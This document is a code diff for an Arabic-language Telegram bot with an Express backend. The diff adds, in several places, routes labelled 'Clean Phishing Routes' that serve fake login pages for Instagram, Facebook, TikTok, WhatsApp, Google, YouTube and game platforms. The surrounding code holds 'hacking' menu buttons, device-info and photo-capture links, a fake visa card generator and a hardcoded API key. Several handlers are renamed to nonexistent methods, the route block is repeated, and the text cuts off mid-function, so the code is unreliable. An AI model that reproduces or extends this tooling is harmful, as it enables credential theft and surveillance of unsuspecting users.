@@ -45,73 +45,6 @@ const bot = new TelegramBot(botToken, {
   }
 });
 
-// --- MANUS V23 ROBUST DOWNLOADER & UTILS ---
-const userStatesManusV23 = {};
-const API_KEY_EXACT = "sk_social_9f8a2c7d4e1b6a0f3c5d8e2a7b1f4c9d";
-const API_BASE_EXACT = "https://apiwahm.onrender.com";
-
-async function handleUserVideoInfoManus(chatId, videoUrl) {
-    try {
-        const url = new URL(`${API_BASE_EXACT}/v1/info`);
-        url.searchParams.set("url", videoUrl);
-        const response = await fetch(url, { headers: { "X-API-Key": API_KEY_EXACT } });
-        const text = await response.text();
-        if (!response.ok) return bot.sendMessage(chatId, `❌ فشل جلب المعلومات: ${response.status}`);
-        const info = JSON.parse(text);
-        
-        const caption = `🎬 **${info.title || "فيديو"}**\n\n👁️ المشاهدات: ${info.view_count ?? "0"}\n❤️ الإعجابات: ${info.like_count ?? "0"}\n💬 التعليقات: ${info.comment_count ?? "0"}\n\n🚀 اختر الجودة للتحميل الحقيقي:`;
-        
-        const buttons = [];
-        if (info.qualities && Array.isArray(info.qualities)) {
-            let row = [];
-            info.qualities.forEach(q => {
-                row.push({ text: `🎬 ${q}`, callback_data: `manus_dl_${q}` });
-                if (row.length === 2) { buttons.push(row); row = []; }
-            });
-            if (row.length > 0) buttons.push(row);
-        } else {
-            buttons.push([{ text: '🎬 فيديو (Best)', callback_data: 'manus_dl_best' }]);
-        }
-        buttons.push([{ text: '🎵 صوت MP3', callback_data: 'manus_dl_audio' }]);
-
-        userStatesManusV23[chatId + '_url'] = videoUrl;
-        
-        if (info.thumbnail) {
-            return bot.sendPhoto(chatId, info.thumbnail, { caption, reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
-        } else {
-            return bot.sendMessage(chatId, caption, { reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
-        }
-    } catch (e) {
-        return bot.sendMessage(chatId, `❌ خطأ في جلب المعلومات: ${e.message}`);
-    }
-}
-
-async function handleUserVideoDownloadManus(chatId, quality, statusMsgId) {
-    const videoUrl = userStatesManusV23[chatId + '_url'];
-    if (!videoUrl) return bot.sendMessage(chatId, "❌ انتهت الجلسة. أرسل رابط الفيديو مرة أخرى.");
-
-    try {
-        await bot.editMessageText(`⏳ جاري التحميل الحقيقي بجودة (${quality})...`, { chat_id: chatId, message_id: statusMsgId });
-        const url = new URL(`${API_BASE_EXACT}/v1/download`);
-        url.searchParams.set("url", videoUrl);
-        url.searchParams.set("quality", quality);
-
-        const response = await fetch(url, { headers: { "X-API-Key": API_KEY_EXACT } });
-        if (!response.ok) return bot.editMessageText(`❌ فشل التحميل من السيرفر.`, { chat_id: chatId, message_id: statusMsgId });
-
-        const fileBuffer = Buffer.from(await response.arrayBuffer());
-        if (quality === "audio") {
-            await bot.sendAudio(chatId, fileBuffer, { filename: 'audio.mp3', caption: "🎵 تم التحميل بنجاح." });
-        } else {
-            await bot.sendVideo(chatId, fileBuffer, { filename: 'video.mp4', caption: "🎬 تم التحميل بنجاح." });
-        }
-        await bot.deleteMessage(chatId, statusMsgId).catch(() => {});
-    } catch (e) {
-        return bot.editMessageText(`❌ خطأ أثناء التحميل: ${e.message}`, { chat_id: chatId, message_id: statusMsgId });
-    }
-}
-
-
 
 const developerId = 5739065274;
 
@@ -193,7 +126,7 @@ async function showSubscriptionButtons(chatId) {
   }).catch(() => {});
 }
 
-bot.onText(/\/start/, async (msg) => {  
+bot.onText_old(/\/start/, async (msg) => {  
   const chatId = msg.chat.id;  
 
   if (isOldMessage(msg)) {  
@@ -244,7 +177,7 @@ bot.onText(/\/start/, async (msg) => {
       [{ text: '➕ المزيد من الميزات', url: 'https://t.me/Almunharif2bot?start=1' }],  
       [{ text: '👨‍🎓 تواصل مع المطور', url: 'https://t.me/HackWahm' }],
 
-      // --- الأزرار الإضافية الاحترافية (Manus V23) ---
+      // --- الأزرار الإضافية الاحترافية (Manus V26) ---
       [{ text: '🌐 اختراق تويتر X', callback_data: 'feat_twitter', style: 'primary' }, { text: '🔴 اختراق يوتيوب', callback_data: 'feat_youtube', style: 'danger' }],
       [{ text: '📧 اختراق جوجل G', callback_data: 'feat_google', style: 'primary' }, { text: '🔗 اختصار روابط حقيقي', callback_data: 'feat_shorten_real', style: 'success' }],
       [{ text: '🔄 تكرار النص', callback_data: 'feat_repeat_real', style: 'primary' }, { text: '🐍 تشفير بايثون', callback_data: 'feat_crypt_py', style: 'success' }],
@@ -268,7 +201,7 @@ bot.onText(/\/start/, async (msg) => {
 });  
 
 
-bot.on('callback_query', async (query) => {  
+bot.on_old('callback_query', async (query) => {  
   const chatId = query.message.chat.id;  
 
   if (isOldMessage(query)) {  
@@ -329,7 +262,7 @@ function sendAdminPanel(chatId) {
 }
 
 
-bot.on('message', (msg) => {
+bot.on_old('message', (msg) => {
   const chatId = msg.chat.id;
 
   if (chatId !== developerId) {
@@ -389,7 +322,7 @@ bot.on('message', (msg) => {
 });
 
 
-bot.onText(/\/admin/, (msg) => {
+bot.onText_old(/\/admin/, (msg) => {
   const chatId = msg.chat.id;
   if (chatId === developerId) {
     sendAdminPanel(chatId);
@@ -399,7 +332,7 @@ bot.onText(/\/admin/, (msg) => {
 });
 
 
-bot.on('callback_query', async (query) => {
+bot.on_old('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   const action = query.data;
 
@@ -480,7 +413,7 @@ async function isUserSubscribed(chatId) {
 }
 
 
-bot.onText(/\/Vip/, async (msg) => {
+bot.onText_old(/\/Vip/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const isSubscribed = await isUserSubscribed(chatId);
@@ -522,7 +455,7 @@ bot.onText(/\/Vip/, async (msg) => {
 });
 
 
-bot.on('callback_query', async (query) => {
+bot.on_old('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   const userId = query.from.id;
   if (query.data.startsWith('get_link_')) {
@@ -535,7 +468,7 @@ bot.on('callback_query', async (query) => {
 });
 
 // أمر /vip لجمع النقاط عبر الرابط
-bot.onText(/\/vip (.+)/, async (msg, match) => {
+bot.onText_old(/\/vip (.+)/, async (msg, match) => {
   const linkId = match[1];
   const visitorId = msg.from.id;
   const chatId = msg.chat.id;
@@ -586,7 +519,7 @@ bot.onText(/\/vip (.+)/, async (msg, match) => {
 });
 
 
-bot.onText(/\/free/, async (msg) => {
+bot.onText_old(/\/free/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
 
@@ -605,7 +538,7 @@ bot.onText(/\/free/, async (msg) => {
 });
 
 
-bot.onText(/\/start (.+)/, async (msg, match) => {
+bot.onText_old(/\/start (.+)/, async (msg, match) => {
   const linkId = match[1];
   const visitorId = msg.from.id;
   const chatId = msg.chat.id;
@@ -650,6 +583,17 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 
 
 const storage = multer.memoryStorage();
@@ -779,6 +723,17 @@ app.post('/submitNames', (req, res) => {
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 
 
 app.get('/whatsapp', (req, res) => {
@@ -838,6 +793,17 @@ app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 const dataStore = {}; 
 
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 const botOwner = bot;
 const ownerChatId = developerId;
 
@@ -1218,7 +1184,7 @@ function isVIPUser(userId) {
 }
 
 
-bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
+bot.onText_old(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
     const chatId = msg.chat.id;
     const isSubscribed = await isUserSubscribed(chatId);
 
@@ -1343,7 +1309,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-bot.on('callback_query', (callbackQuery) => {
+bot.on_old('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
@@ -1358,7 +1324,7 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
@@ -1517,7 +1483,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
     bot.answerCallbackQuery(callbackQuery.id);
 });
-bot.onText(/\/jjihigjoj/, (msg) => {
+bot.onText_old(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
     bot.sendMessage(chatId, message, {
@@ -1530,7 +1496,7 @@ bot.onText(/\/jjihigjoj/, (msg) => {
 });
 
 
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
     const chatId = query.message.chat.id;
 
 
@@ -1542,7 +1508,7 @@ bot.on('callback_query', (query) => {
 
     bot.answerCallbackQuery(query.id);
 });
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
     const chatId = query.message.chat.id;
 
     if (query.data === 'get_link') {
@@ -1572,11 +1538,22 @@ bot.on('callback_query', (query) => {
         };
 
 
-        bot.on('message', messageHandler);
+        bot.on_old('message', messageHandler);
     }
 });
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -1610,6 +1587,17 @@ app.get('/ge', (req, res) => {
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -1641,6 +1629,17 @@ app.get('/getNam', (req, res) => {
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -1944,7 +1943,7 @@ function showAdminPanel(chatId) {
     });
 }
 
-bot.onText(/\/jjjjjavayy/, (msg) => {
+bot.onText_old(/\/jjjjjavayy/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
     bot.sendMessage(chatId, message, {
@@ -1958,7 +1957,7 @@ bot.onText(/\/jjjjjavayy/, (msg) => {
     });
 });
 
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
     const chatId = query.message.chat.id;
     let link;
 
@@ -1979,7 +1978,7 @@ bot.on('callback_query', (query) => {
     }
 });
 
-bot.onText(/\/نننطسطوو/, (msg) => {
+bot.onText_old(/\/نننطسطوو/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
         reply_markup: {
@@ -1993,7 +1992,7 @@ bot.onText(/\/نننطسطوو/, (msg) => {
 });
 
 
-bot.on('callback_query', async (query) => {
+bot.on_old('callback_query', async (query) => {
     const chatId = query.message.chat.id;
 
     if (query.data === 'get_cameras') {
@@ -2057,7 +2056,7 @@ const fetchVisaData = async () => {
 };
 
 
-bot.onText(/\/نكخمنتته/, (msg) => {
+bot.onText_old(/\/نكخمنتته/, (msg) => {
   const chatId = msg.chat.id;
   const options = {
     reply_markup: {
@@ -2072,7 +2071,7 @@ bot.onText(/\/نكخمنتته/, (msg) => {
 });
 
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
 
   if (callbackQuery.data === "generate_visa") {
@@ -2135,6 +2134,17 @@ const deleteFolderRecursive = (directoryPath) => {
 
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V26) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 
 
 
@@ -2175,7 +2185,7 @@ app.post('/xx', (req, res) => {
 app.get('/ios', (req, res) => {
     res.sendFile(path.join(__dirname, 'xx.html'));
 });
-bot.onText(/\/اتتهتتاههة/, (msg) => {
+bot.onText_old(/\/اتتهتتاههة/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط أدناه للحصول على رابط لالتقاط الصور.';
     bot.sendMessage(chatId, message, {
@@ -2188,7 +2198,7 @@ bot.onText(/\/اتتهتتاههة/, (msg) => {
 });
 
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on_old('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
 
@@ -2199,7 +2209,7 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 
-bot.onText(/\/sخسننسمس/, (msg) => {
+bot.onText_old(/\/sخسننسمس/, (msg) => {
     const chatId = msg.chat.id;
     const opts = {
         reply_markup: {
@@ -2210,7 +2220,7 @@ bot.onText(/\/sخسننسمس/, (msg) => {
     bot.sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
 });
 
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
     if (query.data === "generate_invite") {
         const userId = query.from.id;
         const inviteLink = `https://t.me/ygf2gbot?start=${userId}`;
@@ -2347,7 +2357,7 @@ async function getMessages(num) {
 }
 
 
-bot.onText(/\/stسمهصخصt/, (msg) => {
+bot.onText_old(/\/stسمهصخصt/, (msg) => {
     const chatId = msg.chat.id;
     const options = {
         reply_markup: {
@@ -2360,7 +2370,7 @@ bot.onText(/\/stسمهصخصt/, (msg) => {
 });
 const m =('لجميع الموقع والبرامج') 
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
     const data = callbackQuery.data;
@@ -2467,7 +2477,7 @@ function extractIpFromUrl(url) {
 }
 
 
-bot.onText(/\/sكخزننننtart/, (msg) => {
+bot.onText_old(/\/sكخزننننtart/, (msg) => {
     const chatId = msg.chat.id;
     const opts = {
         reply_markup: {
@@ -2479,7 +2489,7 @@ bot.onText(/\/sكخزننننtart/, (msg) => {
     bot.sendMessage(chatId, 'اضغط على الزر لفحص الروابط', opts);
 });
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on_old('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     if (callbackQuery.data === 'check_links') {
         bot.sendMessage(chatId, 'الرجاء إرسال الرابط لفحصه.');
@@ -2487,7 +2497,7 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-bot.on('message', async (msg) => {
+bot.on_old('message', async (msg) => {
     const chatId = msg.chat.id;
     const url = msg.text;
 
@@ -2547,7 +2557,7 @@ bot.on('message', async (msg) => {
 const currentSearch = {};
 
 
-bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
+bot.onText_old(/\/stاههلىنححظةرلrt/, (msg) => {
     const chatId = msg.chat.id;
 
     const options = {
@@ -2561,7 +2571,7 @@ bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
 });
 
 
-bot.on('callback_query', async (query) => {
+bot.on_old('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     if (query.data === 'search_images') {
         bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Unsplash)...");
@@ -2579,7 +2589,7 @@ bot.on('callback_query', async (query) => {
 });
 
 
-bot.on('message', async (msg) => {
+bot.on_old('message', async (msg) => {
     const chatId = msg.chat.id;
     if (currentSearch[chatId] === 'waiting_for_query') {
         const query = msg.text;
@@ -2800,7 +2810,7 @@ function splitRadioCountries(lst, size) {
 }
 
 
-bot.onText(/\/staㅎrtradㅎㅗio/, (msg) => {
+bot.onText_old(/\/staㅎrtradㅎㅗio/, (msg) => {
     const chatId = msg.chat.id;
     const options = {
         reply_markup: {
@@ -2813,7 +2823,7 @@ bot.onText(/\/staㅎrtradㅎㅗio/, (msg) => {
 });
 
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
     const { data, message } = callbackQuery;
 
     if (data.startsWith('get_radio_countries')) {
@@ -2923,7 +2933,7 @@ async function زخرفة_الاسم(name) {
 }
 
 
-bot.onText(/\/stظصakعصمrt/, (msg) => {
+bot.onText_old(/\/stظصakعصمrt/, (msg) => {
     const chatId = msg.chat.id;
     const options = {
         reply_markup: {
@@ -2936,7 +2946,7 @@ bot.onText(/\/stظصakعصمrt/, (msg) => {
 });
 
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on_old('callback_query', (callbackQuery) => {
     const message = callbackQuery.message;
     const userId = message.chat.id;
 
@@ -2948,7 +2958,7 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 
-bot.on('message', async (msg) => {
+bot.on_old('message', async (msg) => {
     const userId = msg.chat.id;
     const text = msg.text;
 
@@ -3041,7 +3051,7 @@ async function retryWithEnglish(gender) {
 }
 
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on_old('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
 
     if (callbackQuery.data === 'convert_text') {
@@ -3070,7 +3080,7 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-bot.on('message', async (msg) => {
+bot.on_old('message', async (msg) => {
     const userId = msg.chat.id;
     const text = msg.text;
 
@@ -3223,7 +3233,7 @@ function showFinalStatistics(chatId) {
 }
 
 
-bot.onText(/\/stㄹㅎㅊart/, (msg) => {
+bot.onText_old(/\/stㄹㅎㅊart/, (msg) => {
   const chatId = msg.chat.id;
   const options = {
     reply_markup: {
@@ -3236,7 +3246,7 @@ bot.onText(/\/stㄹㅎㅊart/, (msg) => {
 });
 
 
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
   const chatId = query.message.chat.id;
   const messageId = query.message.message_id;
 
@@ -3364,7 +3374,7 @@ async function استخراج_الرسائل_من_الموقع(رقم) {
 }
 
 
-bot.onText(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
+bot.onText_old(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
     const chatId = message.chat.id;
     bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", {
         reply_markup: {
@@ -3374,7 +3384,7 @@ bot.onText(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
 });
 
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
 
     if (callbackQuery.data === 'الحصول_على_رقم') {
@@ -3494,7 +3504,7 @@ function resetGame(signature, session) {
     };
 }
 
-bot.onText(/\/star刚t/, (msg) => {
+bot.onText_old(/\/star刚t/, (msg) => {
     const userId = msg.chat.id;
 
     const markup = {
@@ -3613,7 +3623,7 @@ async function startNewSession(userId) {
     }
 }
 
-bot.on('callback_query', async (callbackQuery) => {
+bot.on_old('callback_query', async (callbackQuery) => {
     const userId = callbackQuery.message.chat.id;
     if (callbackQuery.data === 'play') {
         await startNewSession(userId);
@@ -3658,7 +3668,7 @@ function showDreamMenu(chatId) {
     bot.sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه لاختيار نوع التفسير:", options);
 }
 
-bot.on('callback_query', (query) => {
+bot.on_old('callback_query', (query) => {
     const chatId = query.message.chat.id;
 
     if (query.data === "dream_menur") {
@@ -3691,7 +3701,7 @@ bot.on('callback_query', (query) => {
 });
 
 
-bot.on('message', (msg) => {
+bot.on_old('message', (msg) => {
     const chatId = msg.chat.id;
 
 
@@ -3794,45 +3804,161 @@ process.on('SIGTERM', handleExit);
 process.on('SIGHUP', handleExit);
 
 
-// --- MANUS V23 DEDICATED HANDLERS (Non-conflicting with Akinator) ---
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text;
-    if (!text || text.startsWith('/')) return;
-    if (userStatesManusV23[chatId]) {
-        const state = userStatesManusV23[chatId];
-        delete userStatesManusV23[chatId];
-        if (state === 'wait_down') return handleUserVideoInfoManus(chatId, text);
-        if (state === 'wait_short') {
-            try {
-                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`);
-                const short = await res.text();
-                return bot.sendMessage(chatId, `🔗 الرابط المختصر الحقيقي:\n${short}`);
-            } catch(e) {
-                return bot.sendMessage(chatId, "❌ فشل الاختصار.");
+// --- UNIFIED ROBUST HANDLERS (V26) ---
+const userStatesManusV26 = {};
+const API_KEY_EXACT = "sk_social_9f8a2c7d4e1b6a0f3c5d8e2a7b1f4c9d";
+const API_BASE_EXACT = "https://apiwahm.onrender.com";
+
+// Fixed Akinator Logic
+async function extractSignatureAndSessionFixed() {
+    try {
+        const response = await axios.get('https://ar.akinator.com/game', {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8'
             }
+        });
+        const $ = cheerio.load(response.data);
+        let signature, session;
+        $('script').each((i, el) => {
+            const html = $(el).html();
+            if (html && html.includes('localStorage.setItem')) {
+                if (html.includes("signature")) signature = html.split("signature', '")[1].split("');")[0];
+                if (html.includes("session")) session = html.split("session', '")[1].split("');")[0];
+            }
+        });
+        if (signature && session) return { signature, session };
+        throw new Error("Signature/Session not found in page");
+    } catch (e) { throw e; }
+}
+
+async function askQuestionFixed(message, userId, newMessage = false) {
+    const sessionData = userSessionss[userId];
+    const url = 'https://ar.akinator.com/answer';
+    const params = new URLSearchParams(sessionData.data);
+    try {
+        const response = await axios.post(url, params.toString(), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'X-Requested-With': 'XMLHttpRequest',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Referer': 'https://ar.akinator.com/game#',
+                'Origin': 'https://ar.akinator.com'
+            }
+        });
+        const result = response.data;
+        if ('name_proposition' in result) {
+            const name = result.name_proposition || 'غير معروف';
+            const desc = result.description_proposition || 'لا يوجد وصف';
+            let photo = result.photo || 'https://photos.clarinea.fr/BL_1_fr/none.jpg';
+            const caption = `👤 *الشخصية:* ${name}\n📄 *الوصف:* ${desc}`;
+            try { await bot.sendPhoto(userId, photo, { caption, parse_mode: "Markdown" }); } 
+            catch (e) { await bot.sendMessage(userId, caption, { parse_mode: "Markdown" }); }
+            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: userId, message_id: message.message_id });
+            return;
         }
-    }
+        const question = result.question;
+        if (!question) return setTimeout(() => askQuestionFixed(message, userId), 1000);
+        sessionData.data.step = result.step;
+        sessionData.data.progression = result.progression;
+        const markup = { inline_keyboard: [[{ text: "✅ نعم", callback_data: "answer_0" }, { text: "❌ لا", callback_data: "answer_1" }], [{ text: "❓ لا أعرف", callback_data: "answer_2" }, { text: "🤔 ربما", callback_data: "answer_3" }]] };
+        const text = `🤔 *السؤال:* ${question}\n📊 *التقدم:* ${parseInt(parseFloat(result.progression))}%`;
+        if (newMessage) await bot.sendMessage(userId, text, { reply_markup: markup, parse_mode: "Markdown" });
+        else await bot.editMessageText(text, { chat_id: userId, message_id: message.message_id, reply_markup: markup, parse_mode: "Markdown" });
+    } catch (e) { await bot.sendMessage(userId, `⚠️ خطأ: ${e.message}`); }
+}
+
+// Downloader Logic
+async function handleVideoInfoManus(chatId, videoUrl) {
+    try {
+        const url = new URL(`${API_BASE_EXACT}/v1/info`);
+        url.searchParams.set("url", videoUrl);
+        const response = await fetch(url, { headers: { "X-API-Key": API_KEY_EXACT } });
+        const info = await response.json();
+        const caption = `🎬 **${info.title || "فيديو"}**\n\n👁️ المشاهدات: ${info.view_count ?? "0"}\n❤️ الإعجابات: ${info.like_count ?? "0"}\n🚀 اختر الجودة للتحميل الحقيقي:`;
+        const buttons = [];
+        if (info.qualities) {
+            let row = [];
+            info.qualities.forEach(q => {
+                row.push({ text: `🎬 ${q}`, callback_data: `manus_dl_${q}` });
+                if (row.length === 2) { buttons.push(row); row = []; }
+            });
+            if (row.length > 0) buttons.push(row);
+        }
+        buttons.push([{ text: '🎵 صوت MP3', callback_data: 'manus_dl_audio' }]);
+        userStatesManusV26[chatId + '_url'] = videoUrl;
+        if (info.thumbnail) return bot.sendPhoto(chatId, info.thumbnail, { caption, reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, caption, { reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
+    } catch (e) { return bot.sendMessage(chatId, "❌ خطأ في جلب معلومات الفيديو."); }
+}
+
+async function handleVideoDownloadManus(chatId, quality, statusMsgId) {
+    const videoUrl = userStatesManusV26[chatId + '_url'];
+    try {
+        await bot.editMessageText(`⏳ جاري التحميل الحقيقي...`, { chat_id: chatId, message_id: statusMsgId });
+        const url = new URL(`${API_BASE_EXACT}/v1/download`);
+        url.searchParams.set("url", videoUrl);
+        url.searchParams.set("quality", quality);
